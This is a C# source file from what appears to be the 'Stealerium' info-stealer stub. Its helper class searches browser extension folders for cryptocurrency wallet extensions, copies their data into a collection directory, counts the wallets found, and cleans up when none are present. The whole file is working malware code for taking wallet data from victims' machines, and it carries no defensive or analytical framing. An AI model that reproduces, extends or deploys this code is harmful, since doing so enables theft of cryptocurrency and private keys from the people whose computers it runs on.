using System;
using System.Collections.Generic;
using System.IO;
using Stealerium.Stub.Helpers;

namespace Stealerium.Stub.Target.Browsers
{
    internal static class BrowserWalletExtensionsHelper
    {
        /// <summary>
        /// Retrieves wallets from specified directories and copies them to the save directory.
        /// </summary>
        /// <param name="saveDirectory">The directory where wallets will be saved.</param>
        /// <param name="walletsDirectories">A dictionary mapping wallet names to their extension IDs.</param>
        /// <param name="baseBrowserPath">The base path for the browser's extension settings.</param>
        /// <param name="browserName">The name of the browser (e.g., "Edge", "Chrome").</param>
        public static void GetWallets(string saveDirectory, Dictionary<string, string> walletsDirectories, string baseBrowserPath, string browserName)
        {
            try
            {
                int walletsCopied = 0;

                // Iterate through each wallet directory and attempt to copy it
                foreach (var wallet in walletsDirectories)
                {
                    string walletDirectory = Path.Combine(baseBrowserPath, wallet.Value);
                    walletsCopied += CopyWalletFromDirectoryTo(saveDirectory, walletDirectory, wallet.Key) ? 1 : 0;
                }

                // If no wallets were copied, delete the save directory if it exists
                if (walletsCopied == 0 && Directory.Exists(saveDirectory))
                {
                    Filemanager.RecursiveDelete(saveDirectory);
                    Logging.Log($"No wallets found in {browserName} extensions.");
                }
            }
            catch (Exception ex)
            {
                Logging.Log($"Error getting wallets for {browserName}: {ex.Message}");
            }
        }

        /// <summary>
        /// Copies wallet files from the source directory to the target directory.
        /// </summary>
        /// <param name="saveDirectory">The directory where wallets will be saved.</param>
        /// <param name="walletDirectory">The source directory of the wallet extension.</param>
        /// <param name="walletName">The name of the wallet.</param>
        /// <returns>True if the copy was successful; otherwise, false.</returns>
        private static bool CopyWalletFromDirectoryTo(string saveDirectory, string walletDirectory, string walletName)
        {
            try
            {
                if (!Directory.Exists(walletDirectory))
                {
                    return false;
                }

                // Create the save directory if it doesn't exist
                Directory.CreateDirectory(saveDirectory);

                var destinationDirectory = Path.Combine(saveDirectory, walletName);
                Directory.CreateDirectory(destinationDirectory);
                Filemanager.CopyDirectory(walletDirectory, destinationDirectory);

                Counter.BrowserWallets++;
                Logging.Log($"Copied wallet: {walletName} to {destinationDirectory}");
                return true;
            }
            catch (Exception ex)
            {
                Logging.Log($"Error copying wallet {walletName}: {ex.Message}");
                return false;
            }
        }
    }
}
